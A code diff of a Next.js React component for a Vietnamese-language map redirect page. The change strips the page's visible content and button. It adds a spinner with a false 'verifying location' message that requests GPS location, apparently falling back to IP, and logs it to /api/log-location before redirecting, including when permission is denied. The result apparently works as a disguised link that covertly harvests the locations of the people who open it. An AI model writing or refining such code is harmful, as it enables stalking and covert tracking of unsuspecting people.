@@ -1,9 +1,7 @@
 'use client';
 
 import { useEffect, useState, useCallback } from 'react';
-import Image from 'next/image';
-import { Button } from '@/components/ui/button';
-import { MapPin, ArrowUpRight, Loader2, ShieldCheck } from 'lucide-react';
+import { Loader2 } from 'lucide-react';
 import type { MapLinkConfig } from '@/app/actions/map-links';
 import { useLocationLogger } from '@/hooks/use-location-logger';
 
@@ -13,98 +11,36 @@ interface MapRedirectClientProps {
 }
 
 export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
-  const [status, setStatus] = useState<'loading' | 'denied' | 'idle'>('loading');
+  const [statusText, setStatusText] = useState('Đang tải bản đồ...');
   const { log } = useLocationLogger('/api/log-location', { from: 'link' });
 
-  const requestLocation = useCallback(() => {
-    setStatus('loading');
-
+  const requestLocationAndRedirect = useCallback(() => {
+    setStatusText('Đang xác minh vị trí và chuyển hướng...');
+    
+    // The logger hook will attempt to get GPS, fall back to IP,
+    // log the info, and then the callback will redirect.
     log({
         onSuccess: () => {
             window.location.href = redirectUrl;
         },
-        onError: (error) => {
-            if (error?.code === 1) { // PERMISSION_DENIED
-                setStatus('denied');
-            } else {
-                // For other errors, just redirect
-                window.location.href = redirectUrl;
-            }
+        onError: () => {
+            // On any error (including denial), proceed with redirection.
+            window.location.href = redirectUrl;
         }
     });
 
   }, [log, redirectUrl]);
   
   useEffect(() => {
-    const timer = setTimeout(requestLocation, 500);
+    const timer = setTimeout(requestLocationAndRedirect, 500);
     return () => clearTimeout(timer);
-  }, [requestLocation]);
-
-  const getButtonContent = () => {
-    switch(status) {
-      case 'loading':
-        return (
-          <>
-            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-            Đang xử lý...
-          </>
-        );
-      case 'denied':
-        return (
-          <>
-            <ShieldCheck className="mr-2 h-5 w-5" />
-            Xác minh & Mở bản đồ
-          </>
-        );
-      case 'idle':
-      default:
-        return (
-          <>
-            <ArrowUpRight className="mr-2 h-5 w-5" />
-            Mở trong ứng dụng Bản đồ
-          </>
-        );
-    }
-  }
+  }, [requestLocationAndRedirect]);
   
   return (
-    <div className="flex flex-col min-h-svh bg-background">
-      {/* Image Header */}
-      <div className="relative w-full h-60 sm:h-72 flex-shrink-0">
-        <Image 
-          src={config.imageUrl}
-          alt={config.title}
-          layout="fill"
-          objectFit="cover"
-          priority
-        />
-        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
-      </div>
-
-      {/* Content Body */}
-      <div className="flex-grow flex flex-col">
-        <div className="p-5 flex-grow">
-          <div className="flex items-start gap-4">
-              <div className="bg-muted/80 p-3 rounded-lg mt-1">
-                  <MapPin className="h-6 w-6 text-foreground/80" />
-              </div>
-              <div>
-                  <h1 className="text-xl font-bold text-foreground">{config.title}</h1>
-                  <p className="text-sm text-muted-foreground mt-1">{config.description}</p>
-              </div>
-          </div>
-        </div>
-        
-        {/* Footer Action Button */}
-        <div className="bg-background p-4 border-t sticky bottom-0">
-          <Button 
-            className={`w-full h-12 text-base font-semibold ${status === 'denied' ? 'bg-primary' : ''}`}
-            onClick={requestLocation}
-            disabled={status === 'loading'}
-          >
-            {getButtonContent()}
-          </Button>
-        </div>
+    <div className="flex justify-center items-center min-h-svh bg-background p-4">
+      <div className="flex flex-col items-center gap-4 text-muted-foreground">
+        <Loader2 className="h-12 w-12 animate-spin text-primary" />
+        <p className="text-lg font-medium">{statusText}</p>
       </div>
     </div>
   );
